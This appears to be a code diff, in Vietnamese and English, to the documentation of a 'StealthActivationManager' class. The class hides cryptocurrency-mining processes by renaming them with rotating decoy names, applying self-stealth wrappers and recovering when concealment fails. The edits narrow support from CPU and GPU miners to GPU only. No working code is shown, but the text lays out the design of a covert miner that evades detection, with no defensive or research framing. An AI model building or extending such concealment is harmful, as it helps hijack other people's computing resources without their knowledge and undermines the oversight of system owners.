@@ -4,18 +4,18 @@
 🔄 **[Stealth Activation Manager]** (trình quản lý kích hoạt ẩn danh)
 
 Centralized stealth activation system với **[EventBus Integration]** (tích hợp EventBus).
-Tách biệt hoàn toàn logic STEALTH khỏi **cpu_plugin** và **mining processes**.
+Tách biệt hoàn toàn logic STEALTH khỏi **gpu_mining** và **mining processes**.
 
 ⚠️ WORKFLOW:
 1. **EventBus Listener**: Lắng nghe `mining:*_pid_registered` events
-2. **Process Identification**: Xác định loại process (CPU/GPU) và PID  
+2. **Process Identification**: Xác định loại process (GPU) và PID  
 3. **Stealth Strategy Selection**: Chọn chiến lược stealth phù hợp
 4. **External + Self-Stealth**: Kết hợp cả external disguise và self-stealth
 5. **Monitoring & Recovery**: Giám sát và tự động recovery khi cần
 
 ✅ FEATURES:
 - Event-driven stealth activation
-- Support both CPU & GPU processes  
+- Support GPU processes only  
 - Fallback strategies when external stealth fails
 - Centralized logging & monitoring
 - Zero impact on mining performance
@@ -189,7 +189,7 @@ class StealthActivationManager:
         Args:
             pid: Process ID to activate stealth for
             process_name: Original process name  
-            process_type: 'CPU' or 'GPU'
+            process_type: 'GPU' only
             stealth_names: List of decoy names for rotation
             
         Returns:
@@ -223,7 +223,7 @@ class StealthActivationManager:
                 
                 # **Strategy 2**: Self-stealth activation (for processes that support it)
                 # Note: Self-stealth chỉ hoạt động cho processes được wrapped bởi stealth wrappers
-                # CPU và GPU processes hiện tại đã sử dụng stealth wrappers, nên self-stealth đã active
+                # GPU processes hiện tại đã sử dụng stealth wrappers, nên self-stealth đã active
                 
                 # **Record stealth activation**
                 self.active_stealth_processes[pid] = stealth_info
